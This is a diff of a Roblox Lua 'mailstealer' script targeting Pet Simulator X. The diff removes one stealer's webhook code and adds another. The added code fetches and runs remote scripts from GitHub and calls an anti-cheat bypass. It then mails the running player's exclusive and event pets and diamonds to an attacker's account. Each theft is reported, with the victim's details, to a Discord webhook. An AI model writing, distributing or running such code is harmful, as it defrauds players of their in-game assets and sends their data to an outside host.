@@ -1,96 +1,76 @@
- getgenv().Settings = {
-    PremiumKey = "rizzhub-LQOIpi8RuiFDqZ85hgwz",
-    Webhook = false, -- By Making This True The Users Of Your Script Will Be Able
-    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
-    MailMessage = "Monz Better",
-  Titanics = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-  Banana = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-  Huges = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-  Pogs = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-   Exclusives = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-   Events = {
-       Dualhook = false,
-       Intensity = 100--%
-  },
-   Secrets = {
-       Dualhook = false,
-       Intensity = 100--%
-   },
-   HC_DM_Mythics = {
-       Dualhook = false,
-       Intensity = 100--%
-   },
-   Gems = {
-       Dualhook = false,
-       Intensity = 100--%
-  }
-}
-    
-if game.PlaceId == 6284583030 then
-	_G.GameIn = "Pet Simulator X"
-elseif game.PlaceId == 7722306047 then
-	_G.GameIn = "PSX Trading Plaza"
-elseif game.PlaceId == 10321372166 then
-	_G.GameIn = "PSX Hardcore"
-elseif game.PlaceId == 12610002282 then
-	_G.GameIn = "PSX Pro Trading Plaza"
-elseif game.PlaceId == 11725212117 then
-	_G.GameIn = "PSX Voice Trading Plaza"
-else
-	_G.GameIn = "❓ Couldn't find game"
-end
-local webhookcolor = "13369599"
-_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
-_G.PlrUserVictim = game.Players.LocalPlayer.Name
-_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
-_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.PetName = v2.name
-_G.PetRar = v2.rarity
+--paxz mailstealer
 
-local function sendwebhook(msg)
-local msg = {
-  ["content"]= "|| @everyone || **Hostee Mailstealer has detected a new hit!**",
-  ["embeds"]= {
-    {
-      ["title"]= "`Hostee Mailstealer Results`",
-      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
-      ["url"]= "https://discord.gg/hosteehub",
-      ["color"]= ""..webhookcolor.."",
-      ["fields"]= {
-        {
-          ["name"]= "Diamonds 💎",
-          ["value"]= "```".._G.Diamonds.."```",
-          ["inline"]= true
-        },
-        {
-          ["name"]= "Pet Name & Rarity",
-          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
-		  ["inline"]= true
-        }
-      }
-    }
-  },
-  ["attachments"] = {}
-}
-local Webhook = _G.Webhook
-request = http_request or request or HttpPost or syn.request
-request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-end
-sendwebhook(msg)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))()
+local message = "Paxz was here :)"
+
+local function sendGlobalMessage()
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+end
+
+sendGlobalMessage()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Monz", true))()
+
+BypassAntiCheat()
+AreaTeleport("Shop")
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local workspace = game:GetService("Workspace")
+local mailbox = workspace["__MAP"].Interactive.Mailbox.Pad
+local mailboxCFrame = mailbox.CFrame
+rootPart.CFrame = mailboxCFrame
+
+function sendWebhook(webhook, message)
+    local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "Kid with shit exploit"
+
+ local url =
+    webhook
+ local data = {
+    ["content"] = message
+ }
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+ local headers = {
+    ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
+end
+
+local player = game:GetService("Players").LocalPlayer
+
+local dims = player.leaderstats.Diamonds.Value - 80000000
+if dims < 0 then
+    dims = 0
+end
+
+wait(30)
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+            local args = {
+                [1] = {
+                    ["Recipient"] = _G.UserName,
+                    ["Diamonds"] = dims,
+                    ["Pets"] = {
+                        [1] = v.Name
+                    },
+                    ["Message"] = "made by Monz"
+                }
+            }
+        Networking.Invoke("Send Mail", unpack(args))
+        sendWebhook(_G.Webhook, "@everyone Paxz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
+        dims = 0
+        wait(7)
+    end
+end
+end
